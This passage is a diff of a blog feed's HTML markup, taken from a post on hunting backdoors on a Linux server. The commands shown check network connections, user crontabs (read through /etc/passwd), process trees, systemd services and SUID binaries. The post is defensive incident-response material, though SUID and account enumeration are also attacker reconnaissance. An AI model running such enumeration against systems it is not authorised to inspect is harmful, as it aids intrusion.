+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ netstat -antp <span class="p">|</span> grep ESTABLISHED</span></span></code></pre>
+</figure><p><div class="img-container"><img src="imgs/image-20210526034616621.png" alt="image-20210526034616621"  /></div>
 </p>
 <p>When the backdoor fails to reach out the attacker, the state would be displayed as SYN_SENT. To find this we can change the grep part with it.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ netstat -antp <span class="p">|</span> grep SYN_SENT
-</span></span></code></pre></div><p>Next, we could check each user’s crontab using the following commands:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ <span class="k">for</span> user in <span class="k">$(</span>cat /etc/passwd <span class="p">|</span> cut -f1 -d: <span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$user</span><span class="p">;</span> crontab -u <span class="nv">$user</span> -l<span class="p">;</span> <span class="k">done</span>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ netstat -antp <span class="p">|</span> grep SYN_SENT</span></span></code></pre>
+</figure><p>Next, we could check each user’s crontab using the following commands:</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ <span class="k">for</span> user in <span class="k">$(</span>cat /etc/passwd <span class="p">|</span> cut -f1 -d: <span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$user</span><span class="p">;</span> crontab -u <span class="nv">$user</span> -l<span class="p">;</span> <span class="k">done</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># Check only the users who have a login shell</span>
-</span></span><span class="line"><span class="cl">$ <span class="k">for</span> user in <span class="k">$(</span>cat /etc/passwd <span class="p">|</span> grep sh$ <span class="p">|</span> cut -f1 -d: <span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$user</span><span class="p">;</span> crontab -u <span class="nv">$user</span> -l<span class="p">;</span> <span class="k">done</span>
-</span></span></code></pre></div><p>There is also the <code>ps -f</code> command which is quite effective at visualizing the process tree. For example, in the image below we can easily identify the &ldquo;culprit&rdquo; that keeps opening the HTTPS port (443) could be in the <code>.bashrc</code> file. It&rsquo;s because the backdoor gets triggered every time we launch a new interactive shell session.</p>
+</span></span><span class="line"><span class="cl">$ <span class="k">for</span> user in <span class="k">$(</span>cat /etc/passwd <span class="p">|</span> grep sh$ <span class="p">|</span> cut -f1 -d: <span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$user</span><span class="p">;</span> crontab -u <span class="nv">$user</span> -l<span class="p">;</span> <span class="k">done</span></span></span></code></pre>
+</figure><p>There is also the <code>ps -f</code> command which is quite effective at visualizing the process tree. For example, in the image below we can easily identify the &ldquo;culprit&rdquo; that keeps opening the HTTPS port (443) could be in the <code>.bashrc</code> file. It&rsquo;s because the backdoor gets triggered every time we launch a new interactive shell session.</p>
 <p><div class="img-container"><img src="imgs/image-20210526034217561.png" alt="image-20210526034217561"  /></div>
 </p>
 <p>If you prefer the detailed view, consider to use <code>ps auxfww</code> to show process tree with username, TTY, and a wide output.</p>
 <p>I also like to use the <code>watch</code> command to actively monitor the network sockets and processes.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># monitor process</span>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># monitor process</span>
 </span></span><span class="line"><span class="cl">$ watch -n <span class="m">1</span> <span class="s2">&#34;ps auxfww | grep suspected-process&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># monitor net socket</span>
 </span></span><span class="line"><span class="cl">$ watch -n <span class="m">1</span> <span class="s2">&#34;netstat -antp&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># monitor net socket with sus IP</span>
-</span></span><span class="line"><span class="cl">$ watch -n1 <span class="s2">&#34;ss -atp | grep &#39;10.14\|168.24&#39;&#34;</span>
-</span></span></code></pre></div><p>For a backdoor that run as a service, we can try to list all the services with the following command and see if there&rsquo;s an unwanted one.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ systemctl list-unit-files --type<span class="o">=</span>service
-</span></span></code></pre></div><p>Or we can also directly visit the services directory. It&rsquo;s depends on what OS the server is using, but we can start to look at  <code>/lib/systemd/</code> and sort them by date modified.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ find /lib/systemd -type f -iname <span class="s1">&#39;*\.service&#39;</span> -exec ls -lrt <span class="s2">&#34;{}&#34;</span> +<span class="p">;</span>
-</span></span></code></pre></div><h3 id="finding-suid">Finding SUID</h3>
+</span></span><span class="line"><span class="cl">$ watch -n1 <span class="s2">&#34;ss -atp | grep &#39;10.14\|168.24&#39;&#34;</span></span></span></code></pre>
+</figure><p>For a backdoor that run as a service, we can try to list all the services with the following command and see if there&rsquo;s an unwanted one.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ systemctl list-unit-files --type<span class="o">=</span>service</span></span></code></pre>
+</figure><p>Or we can also directly visit the services directory. It&rsquo;s depends on what OS the server is using, but we can start to look at  <code>/lib/systemd/</code> and sort them by date modified.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ find /lib/systemd -type f -iname <span class="s1">&#39;*\.service&#39;</span> -exec ls -lrt <span class="s2">&#34;{}&#34;</span> +<span class="p">;</span></span></span></code></pre>
+</figure><h3 id="finding-suid">Finding SUID</h3>
 <p>To find some suspicious SUID we can use the <code>find</code> commands. It can also detect the SUID that started with dot!</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:/etc/update-motd.d# find / -type f -perm <span class="m">4755</span> 2&gt;/dev/null
-</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210526035623660.png" alt="image-20210526035623660"  /></div>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:/etc/update-motd.d# find / -type f -perm <span class="m">4755</span> 2&gt;/dev/null</span></span></code></pre>
+</figure><p><div class="img-container"><img src="imgs/image-20210526035623660.png" alt="image-20210526035623660"  /></div>
 </p>
 <p>However, I realize that I overlooked an important detail in this section. The <code>-perm 4755</code> option will only locate files with exactly those permissions. This means that files with permissions set to <code>4755</code>, <code>4765</code>, <code>4701</code>, and other variations will be excluded from the search. To ensure we can identify all files with the SUID bit set, we should modify the command to:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ find / -type f -perm -u<span class="o">=</span>s 2&gt;/dev/null
-</span></span></code></pre></div><p>Okay, that’s all I could share with you, I hope you found the information useful and insightful, If you have any questions or additional insights to share, feel free to reach out.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ find / -type f -perm -u<span class="o">=</span>s 2&gt;/dev/null</span></span></code></pre>
+</figure><p>Okay, that’s all I could share with you, I hope you found the information useful and insightful, If you have any questions or additional insights to share, feel free to reach out.</p>
 <p>​</p>
 ]]></content:encoded>
     </item>
